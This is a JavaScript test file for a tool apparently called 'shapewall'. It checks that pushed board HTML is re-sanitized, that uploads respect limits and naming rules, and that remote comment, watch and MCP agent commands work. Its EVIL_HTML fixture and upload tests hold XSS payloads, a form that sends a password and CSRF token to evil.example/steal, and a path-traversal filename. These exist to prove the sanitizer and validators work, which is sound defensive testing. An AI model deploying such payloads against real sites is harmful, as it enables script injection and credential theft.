// `shapewall push` and the remote agent loop: uploads are re-sanitized and
// re-encoded, limits hold, the board API serves the pushed board, and
// `comments --remote`, `watch --remote` and `mcp --remote` work with a token.
import { after, before, test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js'
import { main } from '../src/cli.js'
import { createRemote, remoteSettings } from '../src/remote/remote.js'
import { createRemoteMcpServer } from '../src/remote/remote-mcp.js'
import { watchRemote } from '../src/remote/remote-watch.js'
import { PUSH_LIMITS, createPushStore } from '../src/hosted/push.js'
import { tenant } from '../src/hosted/tenancy.js'
import { createProject, createToken, signUp, startHostedServer, tinyPng, tokenCall, writeLocalCaptures } from './hosted-helpers.js'
import { SAMPLE, tempDir } from './helpers.js'

const FIXTURES = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures')

const EVIL_HTML = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example">
<base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">
<style>@import url(https://evil.example/a.css); body { background: url(https://evil.example/track.png) }</style></head>
<body><p>Hello</p><script>alert(1)</script><img src="x" onerror="alert(2)"><img src="https://evil.example/pixel.gif">
<a href="javascript:alert(3)">js</a><a href="/pricing" target="_blank">ok link</a><iframe src="https://evil.example"></iframe>
<form action="https://evil.example/steal"><input type="hidden" name="csrf" value="token-123"><input type="password" value="hunter2"></form>
<svg><foreignObject><div>x</div></foreignObject><animate attributeName="href" to="javascript:alert(4)"/></svg>
<div style="background:url(https://evil.example/s.png)">styled</div></body></html>`

let hosted
let owner
let project
let token
let configFile
let config
let dir

async function cli(args, env = {}) {
  const lines = []
  const saved = { ...process.env }
  Object.assign(process.env, { SHAPEWALL_TOKEN: token, ...env })
  try {
    const code = await main(args, { out: (line) => lines.push(line), err: (line) => lines.push(line) })
    return { code, out: lines.join('\n') }
  } finally {
    for (const key of Object.keys(process.env)) if (!(key in saved)) delete process.env[key]
    Object.assign(process.env, saved)
  }
}

before(async () => {
  hosted = await startHostedServer('hosted-push')
  owner = await signUp(hosted, { handle: 'olive', displayName: 'Olive' })
  project = await createProject(owner, owner.workspaceId, 'Lumen')
  token = await createToken(owner, owner.workspaceId, project.id, ['read', 'reply', 'status', 'claim', 'resolve', 'push'])
  dir = tempDir('hosted-push-site')
  configFile = path.join(dir, 'shapewall.config.json')
  const raw = structuredClone(SAMPLE)
  // Secrets in the local config that must never leave the machine.
  raw.auth = { storageState: 'secret.auth.json' }
  raw.pages[0].actions = [{ fill: ['#password', 'hunter2-local-secret'] }]
  raw.pages[0].waitFor = '#secret-selector'
  raw.journeys = [{ id: 'buy', name: 'Buy', steps: ['home', 'pricing'] }]
  fs.writeFileSync(configFile, JSON.stringify(raw))
  const { loadConfig } = await import('../src/config.js')
  config = loadConfig(configFile)
  writeLocalCaptures(config, 'sample', { html: EVIL_HTML })
  // A variant beside pricing, and an older version of home.
  const board = path.join(config.outputDir, 'sample')
  fs.mkdirSync(path.join(board, 'variants'), { recursive: true })
  fs.writeFileSync(path.join(board, 'variants', 'bold-1234.desktop.png'), tinyPng())
  fs.writeFileSync(
    path.join(board, 'variants.json'),
    JSON.stringify({ variants: [{ id: 'bold-1234', pageId: 'pricing', title: 'Bold', source: 'https://x' }] }),
  )
  fs.mkdirSync(path.join(board, 'versions'), { recursive: true })
  fs.writeFileSync(path.join(board, 'versions', 'home.desktop.20261020T100000000Z-aaaa.png'), tinyPng())
})
after(() => hosted?.close())

const remoteArgs = () => ['--remote', hosted.origin, '--config', configFile]
const stored = (...parts) => path.join(hosted.dataDir, 'files', owner.workspaceId, project.id, 'sample', ...parts)

test('push uploads the board; the server re-sanitizes HTML exactly like a capture', async () => {
  const result = await cli(['push', ...remoteArgs()])
  assert.equal(result.code, 0, result.out)
  assert.match(result.out, /Pushed \d+ files/)
  const html = fs.readFileSync(stored('captures', 'home.desktop.html'), 'utf8')
  assert.match(html, /<p>Hello<\/p>/)
  assert.match(html, /<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:;/)
  for (const bad of [
    /<script/i,
    /onerror/i,
    /javascript:/i,
    /<iframe/i,
    /<base/i,
    /<link/i,
    /refresh/i,
    /evil\.example\/(x|a|track|pixel|s)\./,
    /@import/,
    /token-123/,
    /hunter2/,
    /foreignObject/i,
    /<animate/i,
    /target=/,
  ]) {
    assert.doesNotMatch(html, bad, String(bad))
  }
  assert.match(html, /href="http:\/\/127\.0\.0\.1:9\/pricing"/, 'safe links stay, absolute')
  // PNGs are re-encoded: the tEXt chunk is gone.
  const png = fs.readFileSync(stored('captures', 'home.desktop.png'))
  assert.equal(png.subarray(1, 4).toString(), 'PNG')
  assert.equal(png.includes(Buffer.from('tEXt')), false)
  assert.ok(fs.existsSync(stored('variants', 'bold-1234.desktop.png')))
  assert.ok(fs.existsSync(stored('versions', 'home.desktop.20261020T100000000Z-aaaa.png')))
  // The definition kept what the board shows and nothing else.
  const row = hosted.db.prepare('SELECT definition FROM boards WHERE project_id = ?').get(project.id)
  assert.doesNotMatch(row.definition, /hunter2|secret-selector|secret\.auth|storageState|loginScript/)
  const definition = JSON.parse(row.definition)
  assert.deepEqual(
    definition.board.pages.map((page) => page.id),
    ['home', 'pricing', 'app'],
  )
  assert.deepEqual(definition.board.journeys[0].steps, ['home', 'pricing'])
  const manifest = JSON.parse(fs.readFileSync(stored('captures', 'manifest.json'), 'utf8'))
  assert.equal(manifest.pages.home.desktop.status, 'ok')
  assert.equal(manifest.pages.home.desktop.version, '20261101T100000000Z-ab12')
})

test('the board API serves the pushed board to members, with live HTML through a signed URL', async () => {
  const base = `/w/${owner.workspaceId}/p/${project.id}/api`
  const info = await owner.browser.get(`${base}/info`)
  assert.equal(info.json.hosted, true)
  assert.equal(info.json.user.name, 'Olive')
  assert.equal(info.json.allowCapture, false)
  const view = await owner.browser.get(`${base}/boards/sample`)
  assert.equal(view.status, 200)
  assert.deepEqual(view.json.captures.home.desktop, {
    file: 'home.desktop.png',
    thumb: 'home.desktop.thumb.png',
    live: 'home.desktop.html',
  })
  assert.equal(view.json.variants[0].id, 'bold-1234')
  assert.equal(view.json.versions.home.desktop[0].version, '20261020T100000000Z-aaaa')
  assert.equal(view.json.journeys[0].id, 'buy')
  const image = await owner.browser.get(`${base}/boards/sample/captures/home.desktop.png?v=1`)
  assert.equal(image.status, 200)
  assert.equal(image.headers['content-type'], 'image/png')
  assert.equal(image.headers['x-content-type-options'], 'nosniff')
  const live = await owner.browser.get(`${base}/boards/sample/live/home.desktop.html`)
  assert.equal(live.status, 302)
  const page = await owner.browser.get(live.headers.location)
  assert.match(page.headers['content-security-policy'], /^sandbox; /)
  assert.match(page.headers['permissions-policy'], /microphone=\(\)/)
  assert.doesNotMatch(page.headers['content-security-policy'], /allow-same-origin/, 'an opaque origin')
  assert.match(page.headers['content-security-policy'], /frame-ancestors 'self'/)
  assert.equal((await owner.browser.get(`${base}/boards/sample/capture`)).status, 403)
  assert.equal((await owner.browser.post(`${base}/boards/sample/journeys`, { name: 'x', steps: ['home', 'app'] })).status, 403)
  // Signed out: the board page sends you to sign in; the API says 401.
  const anonymous = await (await import('./helpers.js')).request(hosted.port, 'GET', `/w/${owner.workspaceId}/p/${project.id}/`)
  assert.equal(anonymous.status, 302)
  assert.match(anonymous.headers.location, /^\/signin\?next=/)
  assert.equal((await (await import('./helpers.js')).request(hosted.port, 'GET', `${base}/boards`)).status, 401)
})

test('uploads with bad names, bad bytes or over the caps are refused', async () => {
  const start = await tokenCall(hosted, token, 'POST', '/api/v1/pushes', {
    body: { title: 'x', board: { id: 'sample', baseUrl: 'http://127.0.0.1:9', pages: [{ id: 'home', path: '/' }] } },
  })
  assert.equal(start.status, 201)
  const put = (area, name, body, type = 'image/png') =>
    tokenCall(hosted, token, 'PUT', `/api/v1/pushes/${start.json.id}/files/${area}/${encodeURIComponent(name)}`, {
      body,
      headers: { 'Content-Type': type, 'Content-Length': Buffer.byteLength(body) },
    })
  assert.equal((await put('captures', 'home.desktop.png', tinyPng())).status, 200)
  assert.equal((await put('captures', 'other.desktop.png', tinyPng())).status, 400, 'a page that is not on the board')
  assert.equal((await put('captures', '../../escape.png', tinyPng())).status, 400)
  assert.equal((await put('captures', 'home.desktop.svg', tinyPng())).status, 400)
  assert.equal((await put('elsewhere', 'home.desktop.png', tinyPng())).status, 400)
  assert.equal((await put('captures', 'home.desktop.png', Buffer.from('<svg onload=alert(1)>'))).json.error.code, 'invalid_png')
  const huge = tinyPng()
  huge.writeUInt32BE(50000, 16)
  assert.equal((await put('captures', 'home.desktop.png', huge)).json.error.code, 'invalid_png')
  const big = Buffer.alloc(PUSH_LIMITS.html + 10, 'a')
  assert.equal((await put('captures', 'home.desktop.html', big, 'text/html')).status, 413)
  assert.equal((await put('captures', 'home.desktop.html', Buffer.from([0xff, 0xfe, 0x00]), 'text/html')).json.error.code, 'invalid_html')
  // Uploads cleaned in parallel cannot pass the file cap together.
  hosted.db.prepare('UPDATE pushes SET files = ? WHERE id = ?').run(PUSH_LIMITS.files - 1, start.json.id)
  let release
  const gate = new Promise((resolve) => (release = resolve))
  const store = createPushStore(tenant(hosted.db, owner.workspaceId), { db: hosted.db, dataDir: hosted.dataDir })
  const cleaner = { clean: async (kind, body) => (await gate, body) }
  const racing = ['home.phone.png', 'home.desktop.thumb.png'].map((name) =>
    store.receive({ pushId: start.json.id, projectId: project.id, area: 'captures', name, body: tinyPng(), cleaner }),
  )
  release()
  const settled = await Promise.allSettled(racing)
  assert.deepEqual(settled.map((item) => item.status).sort(), ['fulfilled', 'rejected'])
  assert.equal(settled.find((item) => item.status === 'rejected').reason.code, 'too_many_files')
  assert.equal(hosted.db.prepare('SELECT files FROM pushes WHERE id = ?').get(start.json.id).files, PUSH_LIMITS.files)
  // Bad definitions: the same rules as a local config.
  const bad = await tokenCall(hosted, token, 'POST', '/api/v1/pushes', { body: { board: { id: 'Bad Id', baseUrl: 'ftp://x', pages: [] } } })
  assert.equal(bad.status, 400)
  assert.equal(bad.json.error.code, 'invalid_board')
  // A push of another token's project is not visible.
  const other = await createProject(owner, owner.workspaceId, 'Other')
  const otherToken = await createToken(owner, owner.workspaceId, other.id)
  const stolen = await tokenCall(hosted, otherToken, 'POST', `/api/v1/pushes/${start.json.id}/commit`, { body: {} })
  assert.equal(stolen.status, 404)
})

test('comments --remote lists, replies, sets status and resolves, with URLs instead of paths', async () => {
  const base = `/w/${owner.workspaceId}/p/${project.id}/api/boards/sample/comments`
  const made = await owner.browser.post(base, {
    pageId: 'pricing',
    viewport: 'desktop',
    x: 50,
    y: 25,
    body: 'Make @agent fix the price',
    anchor: { selector: 'a[data-testid="plus-cta"]', text: 'Try Plus', dx: 0.5, dy: 0.5 },
  })
  assert.equal(made.status, 201)
  const id = String(made.json.comment.id)
  let result = await cli(['comments', ...remoteArgs(), '--json'])
  assert.equal(result.code, 0, result.out)
  const report = JSON.parse(result.out)
  assert.equal(report.count, 1)
  const item = report.comments[0]
  assert.equal(item.author, 'Olive')
  assert.deepEqual(item.mentions, ['agent'])
  assert.equal(item.element.selector, 'a[data-testid="plus-cta"]')
  assert.equal(item.files.screenshot, `${hosted.origin}/api/v1/boards/sample/files/captures/pricing.desktop.png`)
  assert.doesNotMatch(JSON.stringify(report), new RegExp(hosted.dataDir.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')))
  result = await cli(['comments', ...remoteArgs()])
  assert.match(result.out, /screenshot: http:\/\/localhost:\d+\/api\/v1\/boards\/sample\/files\/captures\/pricing\.desktop\.png/)
  result = await cli(['comments', 'reply', id, '--body', 'On it', ...remoteArgs()])
  assert.match(result.out, /Replied to #1 as agent/)
  result = await cli(['comments', 'status', id, 'working', ...remoteArgs()])
  assert.match(result.out, /agent status: working/)
  result = await cli(['comments', 'resolve', id, '--note', 'Fixed', '--ref', 'https://github.com/x/y/pull/1', ...remoteArgs()])
  assert.match(result.out, /#1 is resolved/)
  const after = await owner.browser.get(base)
  const comment = after.json.comments[0]
  assert.equal(comment.status, 'resolved')
  assert.equal(comment.resolution, 'Fixed')
  assert.equal(comment.fixRef, 'https://github.com/x/y/pull/1')
  assert.equal(comment.replies[0].body, 'On it')
  result = await cli(['comments', 'reopen', id, ...remoteArgs()])
  assert.match(result.out, /#1 is open/)
  const reopened = (await owner.browser.get(base)).json.comments[0]
  assert.equal(reopened.reopenCount, 1)
  assert.equal(reopened.agentStatus, null)
})

test('remote settings refuse plain http to other hosts and tokens that are not tokens', () => {
  assert.throws(() => remoteSettings({ remote: 'http://example.com' }, { SHAPEWALL_TOKEN: token }), /https/)
  assert.throws(() => remoteSettings({ remote: 'https://example.com' }, { SHAPEWALL_TOKEN: 'abc' }), /SHAPEWALL_TOKEN/)
  assert.deepEqual(remoteSettings({ remote: 'https://example.com/x' }, { SHAPEWALL_TOKEN: token }), {
    origin: 'https://example.com',
    token,
    source: 'env',
  })
})

test('watch --remote hands each new comment out once', async () => {
  const base = `/w/${owner.workspaceId}/p/${project.id}/api/boards/sample/comments`
  for (const body of ['First for the agent', 'fail']) {
    assert.equal((await owner.browser.post(base, { pageId: 'home', viewport: 'phone', x: 5, y: 5, body })).status, 201)
  }
  const remote = createRemote({ origin: hosted.origin, token })
  const lines = []
  const cwd = tempDir('hosted-watch')
  await watchRemote({
    remote,
    boardId: 'sample',
    projectId: project.id,
    once: true,
    cwd,
    out: (line) => lines.push(JSON.parse(line)),
    log: () => {},
  })
  // #1 was reopened above, so it is new work again.
  assert.deepEqual(lines.map((line) => line.comment.body).sort(), ['First for the agent', 'Make @agent fix the price', 'fail'])
  assert.ok(lines.every((line) => line.comment.agentStatus === 'queued'))
  const again = []
  await watchRemote({ remote, boardId: 'sample', projectId: project.id, once: true, cwd, out: (line) => again.push(line), log: () => {} })
  assert.equal(again.length, 0, 'claimed comments are not handed out twice')

  // With --exec: clear two, run the fake agent on them.
  for (const item of lines) await remote.setAgentStatus('sample', item.comment.id, null)
  const outDir = tempDir('hosted-watch-agent')
  await watchRemote({
    remote,
    boardId: 'sample',
    projectId: project.id,
    once: true,
    cwd,
    exec: `${process.execPath} ${path.join(FIXTURES, 'fake-agent.mjs')} ${outDir}`,
    log: () => {},
  })
  const report = await remote.comments('sample', { status: 'open' })
  const byBody = Object.fromEntries(report.comments.map((item) => [item.body, item]))
  assert.equal(byBody['First for the agent'].agentStatus, 'done')
  assert.equal(byBody.fail.agentStatus, 'needs-human')
  assert.match(byBody.fail.replies.at(-1).body, /Needs a person: the agent command exited with code 3/)
  const got = JSON.parse(fs.readFileSync(path.join(outDir, `got-${byBody['First for the agent'].id}.json`), 'utf8'))
  assert.ok(fs.existsSync(got.env.SHAPEWALL_SCREENSHOT), 'the screenshot was downloaded for the agent')
  assert.equal(got.env.SHAPEWALL_REMOTE, hosted.origin)
})

test('mcp --remote lists, reads with a screenshot crop, replies and resolves; scopes limit the tools', async () => {
  const connect = async (value) => {
    const server = await createRemoteMcpServer({ remote: createRemote({ origin: hosted.origin, token: value }) })
    const client = new Client({ name: 'test', version: '1.0.0' })
    const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair()
    await Promise.all([server.connect(serverTransport), client.connect(clientTransport)])
    return client
  }
  const client = await connect(token)
  const tools = (await client.listTools()).tools.map((item) => item.name).sort()
  assert.deepEqual(tools, ['get_comment', 'list_comments', 'list_pages', 'reply_to_comment', 'resolve_comment', 'set_comment_status'])
  const pages = JSON.parse((await client.callTool({ name: 'list_pages', arguments: {} })).content[0].text)
  assert.equal(pages.pages.length, 3)
  const listed = JSON.parse((await client.callTool({ name: 'list_comments', arguments: { journey: 'buy' } })).content[0].text)
  assert.ok(listed.comments.every((item) => ['home', 'pricing'].includes(item.page.id)))
  const first = listed.comments[0]
  const got = await client.callTool({ name: 'get_comment', arguments: { id: first.id } })
  assert.equal(got.content.at(-1).type, 'image')
  assert.equal(got.content.at(-1).mimeType, 'image/png')
  const resolved = JSON.parse(
    (await client.callTool({ name: 'resolve_comment', arguments: { id: first.id, note: 'Done via MCP' } })).content[0].text,
  )
  assert.equal(resolved.status, 'resolved')
  assert.equal(resolved.agentStatus, 'done')
  await client.close()

  const readOnly = await connect(await createToken(owner, owner.workspaceId, project.id, ['read']))
  assert.deepEqual((await readOnly.listTools()).tools.map((item) => item.name).sort(), ['get_comment', 'list_comments', 'list_pages'])
  await readOnly.close()
})

test('a second push replaces the files and keeps the comments', async () => {
  const before = (await tokenCall(hosted, token, 'GET', '/api/v1/boards/sample/comments?status=all')).json.count
  fs.rmSync(path.join(config.outputDir, 'sample', 'variants'), { recursive: true, force: true })
  fs.writeFileSync(path.join(config.outputDir, 'sample', 'variants.json'), JSON.stringify({ variants: [] }))
  const published = []
  const unsubscribe = hosted.app.locals.events.subscribe((event) => published.push(event.type))
  let result
  try {
    result = await cli(['push', ...remoteArgs()])
  } finally {
    unsubscribe()
  }
  assert.equal(result.code, 0, result.out)
  // A push's start and file uploads publish nothing; only its commit does.
  assert.deepEqual(published, ['push.committed'])
  assert.equal(fs.existsSync(stored('variants', 'bold-1234.desktop.png')), false)
  assert.equal((await tokenCall(hosted, token, 'GET', '/api/v1/boards/sample/comments?status=all')).json.count, before)
  const row = hosted.db.prepare('SELECT push_count FROM boards WHERE project_id = ?').get(project.id)
  assert.equal(row.push_count, 2)
  const committed = hosted.db.prepare("SELECT id FROM pushes WHERE status = 'committed'").all()
  assert.ok(committed.length >= 2)
  for (const row of committed) assert.equal(fs.existsSync(path.join(hosted.dataDir, 'staging', row.id)), false, 'staging is cleaned up')
  assert.equal(fs.readdirSync(path.dirname(stored())).filter((name) => name.includes('.old-')).length, 0)
})
